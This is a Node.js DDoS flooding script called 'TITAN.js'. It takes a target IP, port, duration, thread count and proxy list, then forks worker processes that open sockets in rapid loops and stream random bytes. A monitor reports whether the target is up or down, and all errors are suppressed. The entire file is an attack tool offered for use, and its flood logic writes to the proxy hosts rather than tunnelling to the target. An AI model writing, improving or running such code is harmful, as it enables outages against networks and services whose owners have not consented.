const net = require("net");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

// Performance Optimizations
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (cluster.isMaster) {
    const target_ip = process.argv[2];
    const target_port = process.argv[3];
    const duration = process.argv[4];
    const threads = process.argv[5];
    const proxyFile = process.argv[6];

    if (!target_ip || !target_port || !duration || !threads || !proxyFile) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Usage: node TITAN.js <ip> <port> <time> <threads> <proxy.txt>`);
        process.exit();
    }

    console.log(`\x1b[35m[TITAN-ULTRA]\x1b[0m 🔱 ENGINE DEPLOYED | TARGET: ${target_ip}:${target_port}`);

    // --- LIVE STATUS MONITOR (Every 2 Seconds) ---
    setInterval(() => {
        const check = net.connect({host: target_ip, port: parseInt(target_port), timeout: 1000}, () => {
            console.log(`\x1b[32m[LIVE STATUS] Target ${target_ip} is UP (Responding) ✅\x1b[0m`);
            check.destroy();
        });

        check.on('error', () => {
            console.log(`\x1b[31m[LIVE STATUS] Target ${target_ip} is DOWN (Timed Out) 💀\x1b[0m`);
            check.destroy();
        });

        check.on('timeout', () => {
            console.log(`\x1b[31m[LIVE STATUS] Target ${target_ip} is DOWN (No Response) 💀\x1b[0m`);
            check.destroy();
        });
    }, 2000); // Har 2 second mein message aayega
    
    for (let i = 0; i < threads; i++) cluster.fork();

    setTimeout(() => {
        console.log("\x1b[31m[!] ATTACK FINISHED\x1b[0m");
        process.exit();
    }, duration * 1000);

} else {
    // Workers Attack Logic (Wahi same logic jo pehle di thi)
    const target_ip = process.argv[2];
    const target_port = parseInt(process.argv[3]);
    const proxyFile = process.argv[6];
    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
    const bufferPool = crypto.randomBytes(1024 * 1024); 

    function launchAttack() {
        const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        const socket = net.connect({
            host: proxyRaw[0],
            port: parseInt(proxyRaw[1]),
            noDelay: true,
            keepAlive: true
        });

        socket.on('connect', () => {
            socket.cork(); 
            const stream = () => {
                if (!socket.writable) return;
                const start = Math.floor(Math.random() * (bufferPool.length - 1024));
                socket.write(bufferPool.slice(start, start + 1024));
                setImmediate(stream);
            };
            stream();
            socket.uncork();
        });

        socket.on('error', () => { socket.destroy(); });
        socket.setTimeout(5000, () => socket.destroy());
    }

    setInterval(() => {
        for(let i = 0; i < 5; i++) launchAttack();
    }, 1);
}
